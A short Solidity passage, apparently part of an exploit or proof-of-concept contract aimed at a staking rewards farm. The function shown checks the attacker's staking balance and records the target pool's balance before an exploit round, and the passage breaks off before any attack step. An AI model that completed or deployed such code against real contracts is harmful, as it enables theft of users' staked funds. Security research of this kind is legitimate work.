    function _attemptSingleExploitRound(IStakingRewardsLike farm) internal {
        uint256 walletStake = _availableBalance(stakingTokenAtEntry);
        if (walletStake == 0) {
            return;
        }

        uint256 poolBalanceBefore = IERC20Like(stakingTokenAtEntry).balanceOf(TARGET);
